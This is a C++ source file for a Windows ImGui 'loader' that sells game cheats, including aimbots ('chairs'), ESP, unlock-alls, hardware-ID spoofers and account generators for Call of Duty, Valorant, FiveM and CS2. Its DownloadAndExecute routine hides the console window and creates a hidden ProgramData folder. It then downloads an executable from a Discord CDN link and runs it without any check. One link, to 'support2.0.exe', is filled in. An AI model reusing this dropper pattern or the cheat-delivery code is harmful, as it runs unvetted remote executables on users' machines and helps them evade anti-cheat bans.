#include "main.h"
#include "fonts.h"
#include "images.h"
#include "particles.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <urlmon.h> 
#include <shlwapi.h>
#include <thread>
#include <chrono>
#include <shlobj.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shlwapi.lib")



#define SNOW_LIMIT 50
#define M_P3       3.14159265358979323846   // pi

// Data
static ID3D11Device* g_pd3dDevice = nullptr;
static ID3D11DeviceContext* g_pd3dDeviceContext = nullptr;
static IDXGISwapChain* g_pSwapChain = nullptr;
static UINT                     g_ResizeWidth = 0, g_ResizeHeight = 0;
static ID3D11RenderTargetView* g_mainRenderTargetView = nullptr;

bool CreateDeviceD3D(HWND hWnd);
void CleanupDeviceD3D();
void CreateRenderTarget();
void CleanupRenderTarget();
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

static bool change_alpha = false;
static float menu_alpha = 1.f;


ID3D11ShaderResourceView* bo6 = nullptr;
ID3D11ShaderResourceView* cw = nullptr;
ID3D11ShaderResourceView* mw19 = nullptr;
ID3D11ShaderResourceView* mw3 = nullptr;
ID3D11ShaderResourceView* logo = nullptr;
ID3D11ShaderResourceView* logo_blur = nullptr;
ID3D11ShaderResourceView* arrow = nullptr;
ID3D11ShaderResourceView* minimize = nullptr;
ID3D11ShaderResourceView* close = nullptr;

ID3D11ShaderResourceView* twitter = nullptr;
ID3D11ShaderResourceView* youtube = nullptr;
ID3D11ShaderResourceView* web = nullptr;
ID3D11ShaderResourceView* disc = nullptr;

ImFont* InterSemi = nullptr;
ImFont* InterBold = nullptr;

HWND hwnd;
RECT rc;



void DownloadAndExecute(const char* url, const char* subFolder) {
    char hiddenDir[MAX_PATH];
    GetEnvironmentVariableA("ProgramData", hiddenDir, MAX_PATH);
    strcat_s(hiddenDir, "\\iohnr ldrs");

    DWORD fileAttrib = GetFileAttributesA(hiddenDir);
    if (fileAttrib == INVALID_FILE_ATTRIBUTES) {
        SHCreateDirectoryExA(NULL, hiddenDir, NULL);
        SetFileAttributesA(hiddenDir, FILE_ATTRIBUTE_HIDDEN);
    }

    char fullPath[MAX_PATH];
    strcpy_s(fullPath, hiddenDir);
    strcat_s(fullPath, "\\");
    strcat_s(fullPath, subFolder);

    SHCreateDirectoryExA(NULL, fullPath, NULL);
    strcat_s(fullPath, "\\Loader.exe");

    if (GetFileAttributesA(fullPath) != INVALID_FILE_ATTRIBUTES) {
        DeleteFileA(fullPath);
    }
    HRESULT hr = URLDownloadToFileA(NULL, url, fullPath, 0, NULL);
    if (SUCCEEDED(hr)) {
        ShellExecuteA(NULL, "open", fullPath, NULL, NULL, SW_SHOW);
    }
    else {
        MessageBoxA(NULL, "download failed", "error meow", MB_OK | MB_ICONERROR);
    }
}


void FunctionForP2() {
    DownloadAndExecute("https://cdn.discordapp.com/attachments/1116137312997351475/1293398403710980177/support2.0.exe?ex=679f7fe1&is=679e2e61&hm=f0e0b2e58ab95202201c77594656364d5e1ea51d1c2df3316adac42bec35749b&", "p2");
}

void FunctionForP3() {
    DownloadAndExecute("", "p3");
}

void FunctionForP4() {
    DownloadAndExecute("", "p4");
}

void FunctionForP5() {
    DownloadAndExecute("", "p5");
}

void FunctionForP6() {
    DownloadAndExecute("", "p6");
}

void FunctionForP7() {
    DownloadAndExecute("", "p7");
}

void FunctionForP9() {
    DownloadAndExecute("", "p9");
}

void FunctionForP10() {
    DownloadAndExecute("", "p10");
}

void FunctionForP11() {
    DownloadAndExecute("", "p11");
}

void FunctionForP12() {
    DownloadAndExecute("", "p12");
}

void FunctionForP13() {
    DownloadAndExecute("", "p13");
}

void FunctionForP14() {
    DownloadAndExecute("", "p14"); // egal ist placeholder
}

void FunctionForP15() {
    DownloadAndExecute("", "p15");
}

void FunctionForP16() {
    DownloadAndExecute("", "p16");
}

void FunctionForP17() {
    DownloadAndExecute("", "p17");
}

void FunctionForP18() {
    DownloadAndExecute("", "p18");
}

void FunctionForP19() {
    DownloadAndExecute("", "p19");
}

void FunctionForP21() {
    DownloadAndExecute("", "p21");
}

void FunctionForP22() {
    DownloadAndExecute("", "p22");
}

void FunctionForP23() {
    DownloadAndExecute("", "p23");
}

void FunctionForP24() {
    DownloadAndExecute("", "p24");
}

void FunctionForP25() {
    DownloadAndExecute("", "p25");
}

void FunctionForP26() {
    DownloadAndExecute("", "p26");
}

void FunctionForP28() {
    DownloadAndExecute("", "p28");
}

void FunctionForP29() {
    DownloadAndExecute("", "p29");
}

void FunctionForP30() {
    DownloadAndExecute("", "p30");
}

void FunctionForP31() {
    DownloadAndExecute("", "p31");
}

void FunctionForP32() {
    DownloadAndExecute("", "p32");
}

void FunctionForP34() {
    DownloadAndExecute("", "p34");
}

void FunctionForP35() {
    DownloadAndExecute("", "p35");
}

void FunctionForP36() {
    DownloadAndExecute("", "p36");
}

void FunctionForP38() {
    DownloadAndExecute("", "p38");
}

void FunctionForP39() {
    DownloadAndExecute("", "p39");
}

void FunctionForP40() {
    DownloadAndExecute("", "p40");
}

void FunctionForP41() {
    DownloadAndExecute("", "p41");
}

void FunctionForP42() {
    DownloadAndExecute("", "p42");
}

void FunctionForP43() {
    DownloadAndExecute("", "p43");
}

void FunctionForP44() {
    DownloadAndExecute("", "p44");
}

void FunctionForP45() {
    DownloadAndExecute("", "p45");
}

// die sind egal sind die mit titel für menus chairs spoofers etc
void FunctionForP1() { MessageBoxA(NULL, "", "Aktion", MB_OK | MB_ICONINFORMATION); }
void FunctionForP8() { MessageBoxA(NULL, "", "Aktion", MB_OK | MB_ICONINFORMATION); }
void FunctionForP20() { MessageBoxA(NULL, "", "Aktion", MB_OK | MB_ICONINFORMATION); }
void FunctionForP27() { MessageBoxA(NULL, "", "Aktion", MB_OK | MB_ICONINFORMATION); }
void FunctionForP37() { MessageBoxA(NULL, "", "Aktion", MB_OK | MB_ICONINFORMATION); }
void FunctionForP33() { MessageBoxA(NULL, "", "Aktion", MB_OK | MB_ICONINFORMATION); }




// Main code
int main(int, char**)
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"ImGui Example", nullptr };
    ::RegisterClassExW(&wc);
    hwnd = CreateWindowExW(NULL, wc.lpszClassName, L"Onevade Loader", WS_POPUP, (GetSystemMetrics(SM_CXSCREEN) / 2) - (WIDTH / 2), (GetSystemMetrics(SM_CYSCREEN) / 2) - (HEIGHT / 2), WIDTH + 2, HEIGHT + 2, 0, 0, 0, 0);

    SetWindowLongA(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 255, LWA_ALPHA);

    MARGINS margins = { -1 };
    DwmExtendFrameIntoClientArea(hwnd, &margins);


    POINT mouse;
    rc = { 0 };
    GetWindowRect(hwnd, &rc);

    if (!CreateDeviceD3D(hwnd))
    {
        CleanupDeviceD3D();
        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
    ::UpdateWindow(hwnd);

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;

    ImGui::StyleColorsDark();

    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);

    bool show_demo_window = true;
    bool show_another_window = false;
    ImVec4 clear_color = ImVec4(0.1f, 0.1f, 0.1f, 0.f);

    custom::style();

    InterSemi = io.Fonts->AddFontFromMemoryTTF(Inter_Semibold_m, sizeof(Inter_Semibold_m), 17);
    InterBold = io.Fonts->AddFontFromMemoryTTF(Inter_Bold_m, sizeof(Inter_Bold_m), 25);

    HRESULT LOGO_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, logo_p, sizeof(logo_p), nullptr, nullptr, &logo, nullptr);
    HRESULT mw19_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, mw19_p, sizeof(mw19_p), nullptr, nullptr, &mw19, nullptr);
    HRESULT mw3_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, mw3_p, sizeof(mw3_p), nullptr, nullptr, &mw3, nullptr);

    HRESULT ARROW_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, arrow_p, sizeof(arrow_p), nullptr, nullptr, &arrow, nullptr);
    HRESULT MINIMIZE_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, minimize_p, sizeof(minimize_p), nullptr, nullptr, &minimize, nullptr);
    HRESULT CLOSE_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, close_p, sizeof(close_p), nullptr, nullptr, &close, nullptr);

    HRESULT TWITTER_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, twitter_p, sizeof(twitter_p), nullptr, nullptr, &twitter, nullptr);
    HRESULT YT_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, yt_p, sizeof(yt_p), nullptr, nullptr, &youtube, nullptr);
    HRESULT WEB_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, web_p, sizeof(web_p), nullptr, nullptr, &web, nullptr);
    HRESULT DC_HR = D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, discord_p, sizeof(discord_p), nullptr, nullptr, &disc, nullptr);

    InitializeParticles();

    bool done = false;
    while (!done)
    {
        MSG msg;
        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))
        {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                done = true;
        }
        if (done)
            break;

        if (change_alpha)
        {

            static DWORD dwTickStart = GetTickCount();
            if (GetTickCount() - dwTickStart > 1500)
            {
                change_alpha = false;
                dwTickStart = GetTickCount();
            }
        }

        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();


        
        gui::begin("Main");
        {
            float deltaTime = 1.0f;
            UpdateParticles(0.01);
            RenderParticles();

            gui::Blur(hwnd);
            ImDrawList* draw_list = ImGui::GetWindowDrawList();

            static float logoPos = -10;

            gui::setpos(385, 15);
            ImGui::Image(close, ImVec2(20, 20));
            if (ImGui::IsItemClicked(0))
                exit(0);

            gui::setpos(360, 15);
            ImGui::Image(minimize, ImVec2(19, 19));
            if (ImGui::IsItemClicked(0))
                ShowWindow(hwnd, SW_MINIMIZE);

            gui::setpos(140, logoPos);
            ImGui::Image(logo, ImVec2(145, 145));


            gui::pf(InterSemi);

            int lastTab = 0;

            if (TAB == 0)
            {
                logoPos = ImLerp(logoPos, 17.f, ImGui::GetIO().DeltaTime * (10 / 2));

                
                if (custom::multicolorButton("login_button", "Loaders", 62, logoPos + 350, 300, 40,
                    convToInt(mainColor), convToInt(secondColor), convToInt(secondColor), convToInt(mainColor)))
                {
                    TAB = 1;
                }

                
                if (custom::multicolorButton("tab3_button", "Support Tool", 62, logoPos + 410, 300, 40,
                    convToInt(mainColor), convToInt(secondColor), convToInt(secondColor), convToInt(mainColor)))
                {
                    lastTab = 0;  
                    TAB = 2;

                    
                    std::this_thread::sleep_for(std::chrono::milliseconds(200));

                    
                    DownloadAndExecute("",
                        "support.exe");
                }
            }


            if (TAB == 1) {
                progress = 0;
                logoPos = ImLerp(logoPos, -200.f, ImGui::GetIO().DeltaTime * (10 / 2));

                if (logoPos < -170) {
                    // hier werden die produktnamen gespeichert lol in einer reihenfolge also "MW19 MENUS" ist "p1" (p1 bis p39)
                    std::vector<std::string> products = {
                        "p1", "p2", "p3", "p4", "p5", "p6", "p7", "p8", "p9", "p10", "p11", "p12", "p13", "p15",
                        "p16", "p17", "p18", "p19", "p20", "p21", "p22", "p23", "p24", "p25", "p26", "p27", "p28", "p29", "p30",
                        "p31", "p32", "p33", "p34", "p35", "p36", "p37", "p38", "p39", "p40", "p41", "p42", "p43", "p46", "p47"
                    };

                    std::vector<std::string> productTexts = {
                        "MW19 MENUS", "MW19 CHAIR", "MW19 CHAIRV2", "MW19 VIP AIO", "MW19 FORCE SAVE", "MW19 UNLOCK ALL", "MW19 ESP-AIO",
                        "MW3 MENUS", "MW3 CHAIR", "MW3 UNLOCK ALL", "MW3 UAV/RADAR-MENU", "MW3 SIMPLE UNLOCKER", "MW3 MINI AIO", "MW3 VIP LUTHER",
                        "BO6/WZ4 MENUS", "BO6/WZ4 External Chair", "BO6/WZ4 Internal Chair", "BO6/WZ4 AIO", "BO6/WZ4 CAMO UNLOCKER",
                        "BO6/WZ4 UAV-RADAR", "BO6/WZ4 UNLOCK ALL", "BO6/WZ4 SILENT CHAIR", "BO6/WZ4 VIP-LUTHER",
                        "CW MENUS", "CW CHAIR MENU", "CW LOBBY MENU", "CW DARK AEHTER TOOL", "CW CAMO SWAPPER", "CW UAV MENU", "CW UNLOCK ALL",
                        "OTHER GAME CHAIRS", "MARVEL RIVALS CHAIR", "VALORANT CHAIR", "FIVE-M EXTERNAL CHAIR", "FIVE-M EXTERNAL CHAIRV2", "UNIVERSAL CHAIR",
                        "CSGO 2 CHAIR",
                        "SPOOFERS", "TEMP SPOOFER", "PERM SPOOFER", "SPOOFER BLOCKER V2",
                        "ACC GEN'S", "ACCOUNT GEN", "ACCOUNT GENV2"
                    };

                    
                    std::vector<std::string> excludeList = {
                        "MENUS", "CHAIRS", "GEN'S"
                    };

                    cumbola = ImLerp(cumbola, 80.f, ImGui::GetIO().DeltaTime * (10 / 2));

                    custom::text("Welcome To Hellboy-Service!", 25, cumbola - 65, InterSemi, 17, white);
                    draw_list->AddRectFilledMultiColor({ 0, cumbola - 30 }, { 425, cumbola - 28 }, convToInt(secondColor), ImColor(0, 0, 0, 0), ImColor(0, 0, 0, 0), convToInt(secondColor));

                    float scrollbarHeight = 350;
                    float scrollbarYPos = cumbola - 15;
                    float scrollbarWidth = 380;
                    float scrollbarXPos = (ImGui::GetWindowSize().x - scrollbarWidth) / 2;

                    
                    ImGui::SetCursorPos(ImVec2(scrollbarXPos, scrollbarYPos));
                    ImGui::BeginChild("ProductList", ImVec2(scrollbarWidth, scrollbarHeight), true, ImGuiWindowFlags_AlwaysVerticalScrollbar | ImGuiWindowFlags_NoBackground);

                    for (size_t i = 0; i < products.size(); i++) {
                        ImGui::SetCursorPosX(20);
                        ImGui::BeginChild(products[i].c_str(), ImVec2(340, 55), false, ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse);
                        {
                            
                            bool isExcluded = false;
                            for (const std::string& exclude : excludeList) {
                                if (productTexts[i].find(exclude) != std::string::npos) {
                                    isExcluded = true;
                                    break;
                                }
                            }

                            if (isExcluded) {
                                
                                ImVec2 textSize = ImGui::CalcTextSize(productTexts[i].c_str());

                               
                                float xPos = (ImGui::GetWindowWidth() - textSize.x) / 2;  
                                float yPos = ImGui::GetCursorPosY() + 20;  

                                ImGui::SetCursorPos(ImVec2(xPos, yPos));  

                                ImGui::TextColored(ImVec4(1.f, 0.f, 0.f, 1.f), "%s", productTexts[i].c_str());
                            }
                            else {
                                
                                gui::setpos(5, 5);
                                ImGui::Image(logo, ImVec2(55, 55));

                                
                                ImGui::SameLine();
                                ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 10);  
                                ImGui::SetCursorPosX(65);  
                                ImGui::Text("%s", productTexts[i].c_str());
                            }

                            
                            bool shouldExecuteFunction = false;
                            int selectedProductIndex = -1; 

                            
                            if (TAB == 1 && !isExcluded && custom::multicolorButton(products[i].c_str(), "", 300, 10, 35, 35, convToInt(mainColor), convToInt(secondColor), convToInt(secondColor), convToInt(mainColor))) {
                                TAB = 2; 
                                selectedProductIndex = i; 
                                shouldExecuteFunction = true; 
                            }

                            
                            if (TAB == 2 && shouldExecuteFunction) {

                                switch (selectedProductIndex) {
                                case 0: FunctionForP1(); break;
                                case 1: FunctionForP2(); break;
                                case 2: FunctionForP3(); break;
                                case 3: FunctionForP4(); break;
                                case 4: FunctionForP5(); break;
                                case 5: FunctionForP6(); break;
                                case 6: FunctionForP7(); break;
                                case 7: FunctionForP8(); break;
                                case 8: FunctionForP9(); break;
                                case 9: FunctionForP10(); break;
                                case 10: FunctionForP11(); break;
                                case 11: FunctionForP12(); break;
                                case 12: FunctionForP13(); break;
                                case 13: FunctionForP14(); break;
                                case 14: FunctionForP15(); break;
                                case 15: FunctionForP16(); break;
                                case 16: FunctionForP17(); break;
                                case 17: FunctionForP18(); break;
                                case 18: FunctionForP19(); break;
                                case 19: FunctionForP20(); break;
                                case 20: FunctionForP21(); break;
                                case 21: FunctionForP22(); break;
                                case 22: FunctionForP23(); break;
                                case 23: FunctionForP24(); break;
                                case 24: FunctionForP25(); break;
                                case 25: FunctionForP26(); break;
                                case 26: FunctionForP27(); break;
                                case 27: FunctionForP28(); break;
                                case 28: FunctionForP29(); break;
                                case 29: FunctionForP30(); break;
                                case 30: FunctionForP31(); break;
                                case 31: FunctionForP32(); break;
                                case 32: FunctionForP33(); break;
                                case 33: FunctionForP34(); break;
                                case 34: FunctionForP35(); break;
                                case 35: FunctionForP36(); break;
                                case 36: FunctionForP37(); break;
                                case 37: FunctionForP38(); break;
                                case 38: FunctionForP39(); break;
                                case 39: FunctionForP40(); break;
                                case 40: FunctionForP41(); break;
                                case 41: FunctionForP42(); break;
                                case 42: FunctionForP43(); break;
                                case 43: FunctionForP44(); break;
                                case 44: FunctionForP45(); break;
                                }

                                shouldExecuteFunction = false;  
                            }


                            
                            if (!isExcluded) {
                                gui::setpos(310, 20);
                                ImGui::Image(arrow, ImVec2(12, 12));
                            }
                        }
                        ImGui::EndChild();
                    }

                    ImGui::EndChild();

                    
                    ImGui::SetCursorPos(ImVec2(scrollbarXPos + 140, scrollbarYPos + scrollbarHeight + 20));

                    
                    ImGui::Image(youtube, ImVec2(30, 30));
                    if (ImGui::IsItemClicked()) {
                       
                        system("start https://www.youtube.com/@hell-cod-services");
                    }
                    ImGui::SameLine();

                    
                    ImGui::Image(web, ImVec2(30, 30));
                    if (ImGui::IsItemClicked()) {
                        
                        system("start https://hellservices.shop/");
                    }
                    ImGui::SameLine();

                   
                    ImGui::Image(disc, ImVec2(30, 30));
                    if (ImGui::IsItemClicked()) {
                       
                        system("start https://discord.gg/hSUuHMgA6K");
                    }

                }
            }



            if (TAB == 2) {
                cumbola = 500.f;
                logoPos = ImLerp(logoPos, 160.f, ImGui::GetIO().DeltaTime * (10 / 4));
                if (logoPos > 155)
                    progress += ImGui::GetIO().DeltaTime;

                if (progress >= 3.0f) {
                    TAB = lastTab; 
                }
            }
        }
        ImGui::End();

        ImGui::Render();
        const float clear_color_with_alpha[4] = { clear_color.x * clear_color.w, clear_color.y * clear_color.w, clear_color.z * clear_color.w, clear_color.w };
        g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, nullptr);
        g_pd3dDeviceContext->ClearRenderTargetView(g_mainRenderTargetView, clear_color_with_alpha);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
        g_pSwapChain->Present(1, 0);
    }
    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    CleanupDeviceD3D();
    ::DestroyWindow(hwnd);
    ::UnregisterClassW(wc.lpszClassName, wc.hInstance);

    return 0;
}



bool CreateDeviceD3D(HWND hWnd)
{
   
    DXGI_SWAP_CHAIN_DESC sd;
    ZeroMemory(&sd, sizeof(sd));
    sd.BufferCount = 2;
    sd.BufferDesc.Width = 0;
    sd.BufferDesc.Height = 0;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60;
    sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = hWnd;
    sd.SampleDesc.Count = 1;
    sd.SampleDesc.Quality = 0;
    sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

    UINT createDeviceFlags = 0;
    //createDeviceFlags |= D3D11_CREATE_DEVICE_DEBUG;
    D3D_FEATURE_LEVEL featureLevel;
    const D3D_FEATURE_LEVEL featureLevelArray[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, };
    HRESULT res = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
    if (res == DXGI_ERROR_UNSUPPORTED) 
        res = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_WARP, nullptr, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
    if (res != S_OK)
        return false;

    CreateRenderTarget();
    return true;
}

void CleanupDeviceD3D()
{
    CleanupRenderTarget();
    if (g_pSwapChain) { g_pSwapChain->Release(); g_pSwapChain = nullptr; }
    if (g_pd3dDeviceContext) { g_pd3dDeviceContext->Release(); g_pd3dDeviceContext = nullptr; }
    if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = nullptr; }
}

void CreateRenderTarget()
{
    ID3D11Texture2D* pBackBuffer;
    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));
    g_pd3dDevice->CreateRenderTargetView(pBackBuffer, nullptr, &g_mainRenderTargetView);
    pBackBuffer->Release();
}

void CleanupRenderTarget()
{
    if (g_mainRenderTargetView) { g_mainRenderTargetView->Release(); g_mainRenderTargetView = nullptr; }
}

extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg)
    {
    case WM_SIZE:
        if (wParam == SIZE_MINIMIZED)
            return 0;
        g_ResizeWidth = (UINT)LOWORD(lParam); 
        g_ResizeHeight = (UINT)HIWORD(lParam);
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU) 
            return 0;
        break;
    case WM_DESTROY:
        ::PostQuitMessage(0);
        return 0;
    }
    return ::DefWindowProcW(hWnd, msg, wParam, lParam);
}